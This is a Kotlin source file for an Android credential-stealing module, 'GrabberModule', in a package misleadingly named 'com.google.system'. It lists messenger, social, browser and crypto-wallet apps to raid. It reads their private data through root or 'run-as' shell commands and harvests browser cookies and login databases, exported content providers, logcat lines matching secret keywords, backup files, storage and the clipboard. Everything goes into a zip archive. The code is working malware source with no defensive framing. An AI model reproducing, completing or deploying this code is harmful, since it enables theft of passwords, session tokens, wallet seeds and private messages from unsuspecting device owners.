package com.google.system

import android.content.ClipboardManager
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.database.sqlite.SQLiteDatabase
import android.net.Uri
import android.os.Build
import android.os.Environment
import java.io.BufferedReader
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.io.InputStreamReader
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

object GrabberModule {

    private val HIGH_VALUE_APPS = mapOf(
        "com.discord" to "Discord",
        "com.aliucord" to "Aliucord",
        "org.telegram.messenger" to "Telegram",
        "org.telegram.messenger.web" to "Telegram Web",
        "org.thoughtcrime.securesms" to "Signal",
        "com.whatsapp" to "WhatsApp",
        "com.instagram.android" to "Instagram",
        "com.facebook.katana" to "Facebook",
        "com.twitter.android" to "Twitter/X",
        "com.snapchat.android" to "Snapchat",
        "com.zhiliaoapp.musically" to "TikTok",
        "com.netflix.mediaclient" to "Netflix",
        "com.spotify.music" to "Spotify",
        "com.amazon.mShop.android.shopping" to "Amazon",
        "com.paypal.android.p2pmobile" to "PayPal",
        "com.coinbase.android" to "Coinbase",
        "com.binance.dev" to "Binance",
        "io.metamask" to "MetaMask",
        "com.wallet.crypto.trustapp" to "Trust Wallet",
        "com.phantom" to "Phantom",
        "com.exodus.exodus" to "Exodus",
        "com.blockchainvault" to "Blockchain.com",
        "com.google.android.youtube" to "YouTube",
        "com.google.android.gms" to "Google",
        "com.microsoft.office.outlook" to "Outlook",
        "com.google.android.gm" to "Gmail",
        "com.dropbox.android" to "Dropbox",
        "com.google.android.apps.docs" to "Google Docs",
    )

    private val BROWSERS = mapOf(
        "com.android.chrome" to "Chrome",
        "com.chrome.beta" to "Chrome Beta",
        "com.chrome.dev" to "Chrome Dev",
        "com.brave.browser" to "Brave",
        "com.microsoft.emmx" to "Edge",
        "com.opera.browser" to "Opera",
        "com.opera.gx" to "Opera GX",
        "org.mozilla.firefox" to "Firefox",
        "com.sec.android.app.sbrowser" to "Samsung Browser",
        "com.duckduckgo.mobile.android" to "DuckDuckGo",
        "com.vivaldi.browser" to "Vivaldi",
    )

    private val SENSITIVE_PATTERNS = listOf(
        "password", "passwd", "pwd", "secret", "token", "auth", "login",
        "credential", "key", "cert", "private", "wallet", "seed", "mnemonic",
        "backup", "config", "api_key", "apikey", "access_token", "refresh_token",
        "bearer", "session", "cookie", "oauth", "jwt", "account", "profile",
        "user_data", "userdata", "settings", "database", "preferences",
    )

    private val HIGH_VALUE_EXTS = setOf(
        ".key", ".pem", ".crt", ".p12", ".keystore", ".jks",
        ".env", ".config", ".ini", ".yml", ".yaml", ".toml",
        ".json", ".xml", ".db", ".sqlite", ".sql",
        ".wallet", ".dat", ".bak", ".backup",
    )

    private val CLIPBOARD_KEYWORDS = listOf(
        "password", "token", "key", "secret", "auth",
        "bitcoin", "btc", "eth", "ethereum", "sol", "solana",
        "0x", "bc1", "private", "seed", "mnemonic",
        "api_key", "apikey", "access_token", "refresh_token",
        "bearer", "authorization", "credit", "card", "cvv",
    )

    private const val MAX_ZIP = 50L * 1024 * 1024
    private const val MAX_FILE = 5L * 1024 * 1024
    private const val MAX_FILES = 100

    fun grabAll(ctx: Context) = grab(ctx, "all", deep = true)
    fun grabBrowser(ctx: Context) = grab(ctx, "browser", deep = true)
    fun grabMessenger(ctx: Context) = grab(ctx, "messenger", deep = true)
    fun grabTokens(ctx: Context) = grab(ctx, "tokens", deep = true)
    fun grabWallets(ctx: Context) = grab(ctx, "wallets", deep = true)
    fun grabFiles(ctx: Context) = grab(ctx, "files", deep = true)
    fun grabClipboard(ctx: Context) = grab(ctx, "clipboard", deep = false)

    fun grab(ctx: Context, target: String, deep: Boolean = false): GrabResult {
        val installed = ctx.packageManager.getInstalledPackages(0).map { it.packageName }.toSet()
        val hasRoot = checkRoot()
        val r = GrabResult(hasRoot = hasRoot, installedCount = installed.size)
        val zipFile = File(ctx.cacheDir, "grab_${target}_${System.currentTimeMillis()}.zip")
        try {
            ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
                when (target) {
                    "all" -> {
                        deepScanApps(ctx, installed, hasRoot, zos, r)
                        deepScanStorage(ctx, zos, r)
                        deepScanContentProviders(ctx, zos, r)
                        deepScanLogs(ctx, zos, r)
                        deepScanBackups(ctx, zos, r)
                        scanClipboard(ctx, zos, r)
                    }
                    "browser" -> deepScanBrowsers(ctx, installed, hasRoot, zos, r)
                    "messenger" -> deepScanMessengers(ctx, installed, hasRoot, zos, r)
                    "tokens" -> deepScanTokens(ctx, installed, hasRoot, zos, r)
                    "wallets" -> deepScanWallets(ctx, installed, hasRoot, zos, r)
                    "files" -> deepScanStorage(ctx, zos, r)
                    "clipboard" -> scanClipboard(ctx, zos, r)
                    else -> {
                        deepScanApps(ctx, installed, hasRoot, zos, r)
                        deepScanStorage(ctx, zos, r)
                        deepScanContentProviders(ctx, zos, r)
                        scanClipboard(ctx, zos, r)
                    }
                }
            }
            if (zipFile.exists() && zipFile.length() > 0) {
                r.file = zipFile
                r.size = zipFile.length()
            } else {
                zipFile.delete()
            }
        } catch (e: Exception) {
            r.error = e.message
            zipFile.delete()
        }
        return r
    }

    private fun checkRoot(): Boolean {
        return try {
            val paths = listOf("/system/bin/su", "/system/xbin/su", "/sbin/su", "/su/bin/su", "/data/local/xbin/su", "/data/local/bin/su", "/system/app/Superuser.apk")
            paths.any { File(it).exists() } || runCommand("id").contains("uid=0")
        } catch (_: Exception) { false }
    }

    private fun runCommand(cmd: String): String {
        return try {
            val p = Runtime.getRuntime().exec(if (checkRoot()) "su -c $cmd" else cmd)
            val reader = BufferedReader(InputStreamReader(p.inputStream))
            val output = reader.readText()
            p.waitFor()
            output
        } catch (_: Exception) { "" }
    }

    private fun deepScanApps(ctx: Context, installed: Set<String>, hasRoot: Boolean, zos: ZipOutputStream, r: GrabResult) {
        deepScanBrowsers(ctx, installed, hasRoot, zos, r)
        deepScanMessengers(ctx, installed, hasRoot, zos, r)
        deepScanTokens(ctx, installed, hasRoot, zos, r)
        deepScanWallets(ctx, installed, hasRoot, zos, r)
    }

    private fun deepScanBrowsers(ctx: Context, installed: Set<String>, hasRoot: Boolean, zos: ZipOutputStream, r: GrabResult) {
        for ((pkg, name) in BROWSERS) {
            if (!installed.contains(pkg)) continue
            scanAppDataDir(pkg, name, "browser", zos, r, hasRoot)
            scanExternalAppData(ctx, pkg, name, "browser", zos, r)
        }
    }

    private fun deepScanMessengers(ctx: Context, installed: Set<String>, hasRoot: Boolean, zos: ZipOutputStream, r: GrabResult) {
        for ((pkg, name) in HIGH_VALUE_APPS) {
            if (BROWSERS.containsKey(pkg)) continue
            if (!installed.contains(pkg)) continue
            scanAppDataDir(pkg, name, "messenger", zos, r, hasRoot)
            scanExternalAppData(ctx, pkg, name, "messenger", zos, r)
        }
    }

    private fun deepScanTokens(ctx: Context, installed: Set<String>, hasRoot: Boolean, zos: ZipOutputStream, r: GrabResult) {
        for ((pkg, name) in HIGH_VALUE_APPS) {
            if (BROWSERS.containsKey(pkg) || isWallet(pkg)) continue
            if (!installed.contains(pkg)) continue
            scanAppDataDir(pkg, name, "tokens", zos, r, hasRoot)
            scanExternalAppData(ctx, pkg, name, "tokens", zos, r)
        }
    }

    private fun deepScanWallets(ctx: Context, installed: Set<String>, hasRoot: Boolean, zos: ZipOutputStream, r: GrabResult) {
        for ((pkg, name) in HIGH_VALUE_APPS) {
            if (!isWallet(pkg)) continue
            if (!installed.contains(pkg)) continue
            scanAppDataDir(pkg, name, "wallets", zos, r, hasRoot)
            scanExternalAppData(ctx, pkg, name, "wallets", zos, r)
        }
    }

    private fun scanAppDataDir(pkg: String, name: String, category: String, zos: ZipOutputStream, r: GrabResult, hasRoot: Boolean) {
        val dir = File("/data/data/$pkg")
        if (dir.exists() && dir.canRead()) {
            scanDirRecursive(dir, "$category/$name", zos, r)
        } else if (hasRoot) {
            val output = runCommand("find /data/data/$pkg -type f -size +0c -size -5M 2>/dev/null | head -50")
            for (path in output.lines()) {
                if (path.isBlank() || r.size >= MAX_ZIP || r.files >= MAX_FILES) continue
                val f = File(path)
                if (f.exists() && f.length() in 1..MAX_FILE) {
                    val rel = path.substring("/data/data/$pkg/".length)
                    if (zip(f, "$category/$name/root_$rel", zos)) {
                        r.files++; r.size += f.length()
                        if (isSensitive(f.name)) r.highValue++
                    }
                }
            }
        } else {
            val output = runCommand("run-as $pkg ls / 2>/dev/null")
            if (output.isNotBlank()) {
                val files = runCommand("run-as $pkg find / -type f 2>/dev/null | head -50")
                for (path in files.lines()) {
                    if (path.isBlank() || r.size >= MAX_ZIP || r.files >= MAX_FILES) continue
                    val content = runCommand("run-as $pkg cat $path 2>/dev/null")
                    if (content.isNotBlank() && content.length < MAX_FILE.toInt()) {
                        val rel = path.trimStart('/', ' ')
                        val entryName = "$category/$name/runas_$rel"
                        try {
                            zos.putNextEntry(ZipEntry(entryName))
                            zos.write(content.toByteArray())
                            zos.closeEntry()
                            r.files++; r.size += content.length
                            if (isSensitive(rel)) r.highValue++
                        } catch (_: Exception) {}
                    }
                }
            }
        }
    }

    private fun scanExternalAppData(ctx: Context, pkg: String, name: String, category: String, zos: ZipOutputStream, r: GrabResult) {
        val roots = listOfNotNull(
            Environment.getExternalStorageDirectory(),
            ctx.getExternalFilesDir(null)?.parentFile?.parentFile?.parentFile,
        )
        for (root in roots) {
            val extData = File(root, "Android/data/$pkg")
            if (extData.exists() && extData.canRead()) {
                scanDirRecursive(extData, "$category/$name/external", zos, r)
            }
        }
    }

    private fun scanDirRecursive(dir: File, zipPrefix: String, zos: ZipOutputStream, r: GrabResult) {
        if (r.size >= MAX_ZIP || r.files >= MAX_FILES) return
        try {
            val files = dir.listFiles() ?: return
            for (f in files) {
                if (r.size >= MAX_ZIP || r.files >= MAX_FILES) return
                if (f.isDirectory) {
                    scanDirRecursive(f, "$zipPrefix/${f.name}", zos, r)
                } else if (f.isFile && f.length() in 1..MAX_FILE) {
                    if (isSensitive(f.name) || f.extension.lowercase() in HIGH_VALUE_EXTS ||
                        f.name.equals("Cookies", ignoreCase = true) ||
                        f.name.equals("Login Data", ignoreCase = true) ||
                        f.name.equals("Web Data", ignoreCase = true) ||
                        f.name.equals("History", ignoreCase = true)) {
                        if (zip(f, "$zipPrefix/${f.name}", zos)) {
                            r.files++; r.size += f.length()
                            if (isSensitive(f.name)) r.highValue++
                        }
                    }
                }
            }
        } catch (_: Exception) {}
    }

    private fun deepScanStorage(ctx: Context, zos: ZipOutputStream, r: GrabResult) {
        val dirs = listOfNotNull(
            Environment.getExternalStorageDirectory(),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
            File(Environment.getExternalStorageDirectory(), "Android/data"),
            File(Environment.getExternalStorageDirectory(), "Android/obb"),
            File("/sdcard/Download"),
            File("/sdcard/Documents"),
        )
        val found = mutableListOf<File>()
        for (root in dirs) {
            if (found.size >= MAX_FILES || r.size >= MAX_ZIP) break
            if (root.exists() && root.canRead()) collectDeep(root, found, MAX_FILES)
        }
        for (f in found) {
            if (r.size >= MAX_ZIP) break
            val root = dirs.firstOrNull { f.absolutePath.startsWith(it.absolutePath) } ?: continue
            val rel = f.absolutePath.substring(root.absolutePath.length + 1)
            if (zip(f, "storage/$rel", zos)) { r.files++; r.size += f.length() }
        }
    }

    private fun deepScanContentProviders(ctx: Context, zos: ZipOutputStream, r: GrabResult) {
        try {
            val pm = ctx.packageManager
            val packages = pm.getInstalledPackages(PackageManager.GET_PROVIDERS)
            for (pkgInfo in packages) {
                if (r.files >= MAX_FILES) break
                val providers = pkgInfo.providers ?: continue
                for (provider in providers) {
                    if (r.files >= MAX_FILES) break
                    if (!provider.exported) continue
                    val authority = provider.authority ?: continue
                    val uri = Uri.parse("content://$authority")
                    try {
                        val cursor = ctx.contentResolver.query(uri, null, null, null, null)
                        if (cursor != null) {
                            val cols = cursor.columnNames.joinToString("\t")
                            val rows = mutableListOf<String>()
                            var count = 0
                            while (cursor.moveToNext() && count < 100) {
                                val row = (0 until cursor.columnCount).map { cursor.getString(it) ?: "null" }.joinToString("\t")
                                rows.add(row)
                                count++
                            }
                            cursor.close()
                            if (rows.isNotEmpty()) {
                                val content = "$cols\n${rows.joinToString("\n")}\n"
                                val entryName = "providers/${pkgInfo.packageName}/${authority.replace('.', '_')}.tsv"
                                zos.putNextEntry(ZipEntry(entryName))
                                zos.write(content.toByteArray())
                                zos.closeEntry()
                                r.files++; r.size += content.length; r.highValue++
                            }
                        }
                    } catch (_: Exception) {}
                }
            }
        } catch (_: Exception) {}
    }

    private fun deepScanLogs(ctx: Context, zos: ZipOutputStream, r: GrabResult) {
        try {
            val output = runCommand("logcat -d -t 5000")
            if (output.isNotBlank()) {
                val sensitiveLines = output.lines().filter { line ->
                    val lower = line.lowercase()
                    SENSITIVE_PATTERNS.any { lower.contains(it) } || CLIPBOARD_KEYWORDS.any { lower.contains(it) }
                }
                if (sensitiveLines.isNotEmpty()) {
                    val content = sensitiveLines.take(500).joinToString("\n")
                    zos.putNextEntry(ZipEntry("logs/sensitive_logcat.txt"))
                    zos.write(content.toByteArray())
                    zos.closeEntry()
                    r.files++; r.size += content.length; r.highValue++
                }
            }
        } catch (_: Exception) {}
    }

    private fun deepScanBackups(ctx: Context, zos: ZipOutputStream, r: GrabResult) {
        val backupDirs = listOf(
            "/data/media/0",
            "/sdcard/",
            "/storage/emulated/0/",
        )
        val backupPatterns = listOf(".backup", ".bak", "backup_", "_backup", "backup.tar", "backup.zip", "backup.db")
        for (dir in backupDirs) {
            if (r.files >= MAX_FILES || r.size >= MAX_ZIP) break
            val d = File(dir)
            if (d.exists() && d.canRead()) {
                scanForBackups(d, backupPatterns, zos, r)
            }
        }
    }

    private fun scanForBackups(dir: File, patterns: List<String>, zos: ZipOutputStream, r: GrabResult) {
        if (r.files >= MAX_FILES || r.size >= MAX_ZIP) return
        try {
            val files = dir.listFiles() ?: return
            for (f in files) {
                if (r.files >= MAX_FILES || r.size >= MAX_ZIP) return
                if (f.isDirectory && f.name !in listOf("system", "proc", "sys", "dev")) {
                    scanForBackups(f, patterns, zos, r)
                } else if (f.isFile && f.length() < MAX_FILE) {
                    val nameLower = f.name.lowercase()
                    if (patterns.any { nameLower.contains(it) }) {
                        if (zip(f, "backups/${f.name}", zos)) {
                            r.files++; r.size += f.length(); r.highValue++
                        }
                    }
                }
            }
        } catch (_: Exception) {}
    }

    private fun scanClipboard(ctx: Context, zos: ZipOutputStream, r: GrabResult) {
        try {
            val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clip = cm.primaryClip
            if (clip != null && clip.itemCount > 0) {
                val text = clip.getItemAt(0).coerceToText(ctx).toString()
                if (text.isNotBlank()) {
                    val matches = CLIPBOARD_KEYWORDS.filter { text.lowercase().contains(it) }
                    val content = buildString {
                        appendLine("=== CLIPBOARD ===")
                        appendLine("Time: ${System.currentTimeMillis()}")
                        appendLine("Length: ${text.length}")
                        if (matches.isNotEmpty()) appendLine("ALERT: ${matches.joinToString(", ")}")
                        appendLine()
                        appendLine(text)
                    }
                    zos.putNextEntry(ZipEntry("clipboard/current.txt"))
                    zos.write(content.toByteArray())
                    zos.closeEntry()
                    r.files++
                    r.size += content.length
                    if (matches.isNotEmpty()) r.highValue++
                }
            }
        } catch (_: Exception) {}
    }

    private fun collectDeep(dir: File, found: MutableList<File>, max: Int) {
        if (found.size >= max) return
        try {
            val files = dir.listFiles() ?: return
            for (f in files.sortedByDescending { it.length() }) {
                if (found.size >= max) return
                if (f.isDirectory) collectDeep(f, found, max)
                else if (f.isFile && f.length() in 1..MAX_FILE) {
                    val n = f.name.lowercase()
                    if (SENSITIVE_PATTERNS.any { n.contains(it) } || HIGH_VALUE_EXTS.any { n.endsWith(it) }) {
                        found.add(f)
                    }
                }
            }
        } catch (_: Exception) {}
    }

    private fun zip(file: File, entryName: String, zos: ZipOutputStream): Boolean {
        return try {
            zos.putNextEntry(ZipEntry(entryName))
            FileInputStream(file).use { fis ->
                val buf = ByteArray(8192)
                var n: Int
                while (fis.read(buf).also { n = it } > 0) zos.write(buf, 0, n)
            }
            zos.closeEntry()
            true
        } catch (_: Exception) { false }
    }

    private fun isSensitive(name: String): Boolean {
        val n = name.lowercase()
        return SENSITIVE_PATTERNS.any { n.contains(it) } || HIGH_VALUE_EXTS.any { n.endsWith(it) }
    }

    private fun isWallet(pkg: String) = pkg.contains("wallet") || pkg.contains("coin") ||
        pkg.contains("crypto") || pkg.contains("metamask") || pkg.contains("phantom") ||
        pkg.contains("trust") || pkg.contains("exodus") || pkg.contains("blockchain") ||
        pkg.contains("binance")

    class GrabResult(
        val hasRoot: Boolean = false,
        val installedCount: Int = 0
    ) {
        var file: File? = null
        var size: Long = 0
        var files: Int = 0
        var highValue: Int = 0
        var cookies: Int = 0
        var providers: Int = 0
        var error: String? = null

        fun summary(): String {
            val s = when {
                size < 1024 -> "${size}B"
                size < 1024 * 1024 -> "${size / 1024}KB"
                else -> "${size / (1024 * 1024)}MB"
            }
            val root = if (hasRoot) " [ROOT]" else ""
            return "$files files ($highValue high-value) — $s | $installedCount apps scanned$root"
        }
    }
}
